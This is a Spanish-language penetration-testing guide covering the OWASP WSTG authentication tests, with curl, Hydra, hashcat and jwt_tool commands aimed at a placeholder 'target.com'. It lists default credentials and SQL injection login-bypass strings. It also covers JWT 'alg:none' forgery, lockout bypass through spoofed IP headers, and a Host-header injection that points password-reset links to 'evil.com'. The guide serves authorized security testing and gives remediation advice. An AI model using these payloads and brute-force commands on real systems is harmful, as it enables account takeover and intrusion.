# 4.4 Authentication Testing (WSTG-ATHN)

## WSTG-ATHN-01: Testing for Credentials Transported over an Encrypted Channel

```bash
# Verificar que login use HTTPS
curl -I http://target.com/login  # ¿redirige a HTTPS?

# Buscar en source HTML si form action usa HTTP
grep -i "action=\"http://" *.html

# Verificar cookie Secure flag
curl -I https://target.com/login | grep -i set-cookie

# Verificar que no haya mixed content (recursos HTTP en página HTTPS)
curl -s https://target.com/login | grep -oE 'src="http://[^"]*"|href="http://[^"]*"'
```

Si las credenciales se transmiten por HTTP, o el formulario de login se sirve sobre HTTP (incluso si el POST va a HTTPS), existe riesgo de interceptación (MitM).

---

## WSTG-ATHN-02: Testing for Default Credentials

### Bases de Datos de Credenciales por Defecto
- SecLists: `/SecLists/Passwords/Default-Credentials/`
- cirt.net/passwords
- default-password.info

### Credenciales Comunes
```
admin:admin  admin:password  admin:1234  admin:admin123
root:root  root:toor  test:test  guest:guest
administrator:administrator  sa:(vacío) [MSSQL]
oracle:oracle  postgres:postgres  pi:raspberry
tomcat:tomcat  manager:manager  weblogic:weblogic
```

### Fuerza Bruta con Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  https-post-form://target.com/login:username=^USER^&password=^PASS^:F=Invalid

# SSH
hydra -l root -P passwords.txt ssh://target.com

# HTTP Basic Auth
hydra -l admin -P passwords.txt https-get://target.com/admin
```

Revisar también paneles de administración de software de terceros (Tomcat Manager, Jenkins, phpMyAdmin, Grafana, Kibana) que suelen desplegarse con credenciales por defecto sin cambiar.

---

## WSTG-ATHN-03: Testing for Weak Lock Out Mechanism

```bash
# Probar si hay lockout después de N intentos fallidos
for i in {1..20}; do
  curl -X POST https://target.com/login \
    -d "username=admin&password=wrong$i" -s | grep -i "locked\|blocked\|attempts"
done

# Verificar si el bloqueo es bypasseable manipulando IP de origen:
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d "username=admin&password=test"

# Probar también con:
# X-Real-IP, X-Originating-IP, X-Remote-IP, X-Client-IP
```

### Aspectos a Verificar
- ¿Existe lockout tras N intentos fallidos?
- ¿El lockout es por cuenta, por IP, o ambos?
- ¿Se puede bypassear rotando IP (headers spoofed) o usando diferentes user-agents?
- ¿El lockout puede usarse para DoS contra cuentas legítimas (bloquear intencionalmente la cuenta de otro usuario)?
- ¿Cuánto dura el bloqueo? ¿Es razonable?

---

## WSTG-ATHN-04: Testing for Bypassing Authentication Schema

### Técnicas de Bypass

```bash
# 1. Manipular parámetros booleanos en request/cookie
Cookie: authenticated=false → authenticated=true
Cookie: role=user → role=admin

# 2. Acceder a páginas protegidas directamente (missing auth check)
curl https://target.com/dashboard  # sin sesión

# 3. SQL injection en login
username: admin'--
username: ' OR 1=1--
username: admin' OR '1'='1
password: anything

# 4. Manipular respuesta (cambiar "false" a "true" con proxy)
# En Burp: usar Match and Replace en respuesta del servidor

# 5. JWT manipulation
# Cambiar alg:HS256 → alg:none, borrar signature
# Crackear secret con john: john --wordlist=rockyou.txt jwt.txt
# Cambiar alg:RS256 → alg:HS256 usando clave pública como secret

# 6. Forced browsing a endpoints de API que omiten el check del frontend
curl https://target.com/api/v1/account  # sin token, directo

# 7. Manipulación de parámetros multi-step (flujos de login en varios pasos)
# Saltar directamente al último paso del flujo de autenticación
```

---

## WSTG-ATHN-05: Testing for Vulnerable Remember Password

```bash
# Analizar cookie "remember me":
# - ¿Es predecible? (username en base64, timestamp, hash simple)
# - ¿Tiene expiración adecuada?
# - ¿Se invalida al hacer logout o cambiar contraseña?
echo "dXNlcm5hbWU6cGFzc3dvcmQ=" | base64 -d

# Probar si el token "remember me" sigue siendo válido tras logout
curl -b "remember_token=CAPTURED_VALUE" https://target.com/dashboard
```

### Aspectos a Verificar
- El token debe ser aleatorio (no derivado de username/password/timestamp predecible)
- Debe tener una expiración razonable
- Debe invalidarse al hacer logout explícito o cambiar la contraseña
- Idealmente debe estar ligado a un fingerprint del dispositivo/navegador

---

## WSTG-ATHN-06: Testing for Browser Cache Weaknesses

```bash
# Verificar headers de caché en páginas sensibles
curl -sI https://target.com/account | grep -i "cache-control\|pragma\|expires"
# Debe ser: Cache-Control: no-store, no-cache, must-revalidate

# Verificar atributo autocomplete en campos de password
grep -i "autocomplete" page_source.html  # debe ser autocomplete="off" en passwords

# Verificar si el botón "atrás" del navegador revela contenido autenticado tras logout
```

### Aspectos a Verificar
- Páginas con datos sensibles deben enviar `Cache-Control: no-store`
- Formularios de login/pago deben usar `autocomplete="off"` (o `autocomplete="new-password"`)
- Tras logout, navegar "atrás" no debe mostrar contenido autenticado cacheado

---

## WSTG-ATHN-07: Testing for Weak Password Policy

### Checklist
- Longitud mínima ≥ 8 caracteres (preferiblemente 12+, NIST 800-63B recomienda priorizar longitud sobre complejidad)
- Complejidad: ¿exige combinación de mayúsculas, minúsculas, números, especiales?
- Verificar en registro si acepta contraseñas triviales: `password`, `123456`, `qwerty`, `12345678`
- ¿Verifica la contraseña contra listas de contraseñas filtradas (haveibeenpwned API)?
- ¿Permite espacios en blanco o contraseñas extremadamente largas (DoS via bcrypt con input gigante)?
- ¿Existe límite máximo de longitud razonable (para evitar DoS, pero no tan corto que limite entropía)?

```bash
# Probar contraseñas débiles en registro
curl -X POST https://target.com/register -d "username=test&password=12345678"
curl -X POST https://target.com/register -d "username=test&password=password"

# Probar contraseña extremadamente larga (DoS potencial en bcrypt)
python3 -c "print('A'*100000)" | xargs -I{} curl -X POST https://target.com/register -d "username=test2&password={}"
```

---

## WSTG-ATHN-08: Testing for Weak Security Question Answer

### Pruebas
- ¿Las preguntas de seguridad son genéricas y adivinables (color favorito, ciudad de nacimiento)?
- ¿La respuesta puede obtenerse via OSINT (redes sociales del usuario)?
- ¿Existe rate limiting en el formulario de respuesta a preguntas de seguridad?
- ¿Las preguntas/respuestas se almacenan y comparan en texto plano o son normalizadas (case-insensitive, trimming) de forma insegura?
- ¿Permite al usuario definir sus propias preguntas (mejor que preguntas predefinidas débiles)?

```bash
# Probar fuerza bruta sobre la respuesta de seguridad (si no hay rate limit)
for ans in red blue green black white; do
  curl -X POST https://target.com/security-question \
    -d "username=victim&answer=$ans"
done
```

---

## WSTG-ATHN-09: Testing for Weak Password Change or Reset Functionalities

### Testing Password Reset

```bash
# 1. ¿El token de reset expira?
# Solicitar reset, esperar tiempo prolongado, intentar usar el token

# 2. ¿El token es predecible?
# Solicitar múltiples resets, comparar tokens, analizar entropía

# 3. ¿Es reutilizable después de usarse una vez?
# Usar el token, luego intentar usarlo de nuevo

# 4. ¿Se invalida al cambiar la contraseña por otro medio?
# Cambiar password desde "mi cuenta", luego intentar usar un token de reset viejo

# 5. Host Header Injection en email de reset
curl -X POST https://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"
# → El link en el correo enviado a la víctima podría apuntar a evil.com

# 6. Manipulación del parámetro email junto al token en el link de reset
# https://target.com/reset?token=abc&email=attacker@evil.com
```

### Testing Password Change (usuario autenticado)
- ¿Requiere la contraseña actual para establecer una nueva? (previene CSRF de cambio de password)
- ¿Notifica al usuario por email cuando su contraseña cambia?
- ¿Invalida todas las demás sesiones activas tras el cambio?

### JWT Testing (frecuentemente relacionado con reset/sesión)
```bash
# Decodificar JWT (sin verificar)
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx" | \
  cut -d. -f2 | base64 -d 2>/dev/null

# Probar alg:none
# Header: {"alg":"none"}
# Payload: {"sub":"admin","role":"admin"}
# Sin signature

# Crackear secret HS256
hashcat -a 0 -m 16500 jwt.token rockyou.txt
python3 jwt_tool.py token.jwt -C -d rockyou.txt

# Herramientas: jwt_tool, jwt-cracker, hashcat
```

---

## WSTG-ATHN-10: Testing for Weaker Authentication in Alternative Channel

### Objetivo
Identificar canales de autenticación alternativos (móvil, API, formato legacy, "modo simplificado") que puedan tener controles más débiles que el canal principal.

### Pruebas
- ¿Existe una API móvil o "legacy" que use Basic Auth en vez de OAuth/tokens modernos?
- ¿El canal alternativo tiene el mismo rate limiting / lockout que el canal web principal?
- ¿El canal alternativo permite los mismos métodos de auth débiles (ej. solo PIN de 4 dígitos en vez de password completo)?
- Revisar autenticación vía IVR/SMS/USSD si aplica — suelen tener controles mucho más débiles
- Comparar políticas de password/MFA entre app móvil, web y API pública

```bash
# Probar si la API tiene autenticación más débil que el frontend web
curl -u admin:admin https://api.target.com/v1/login  # Basic Auth en API legacy
curl -X POST https://target.com/login -d "username=admin&password=admin"  # canal principal, más protegido
```

### Remediación General (ATHN)
- Mensajes de error genéricos, uniformes en todos los canales
- MFA consistente en todos los canales de autenticación
- Rate limiting / lockout aplicado de forma centralizada, no solo en el frontend principal
- Tokens de reset/remember-me aleatorios, de un solo uso, con expiración corta
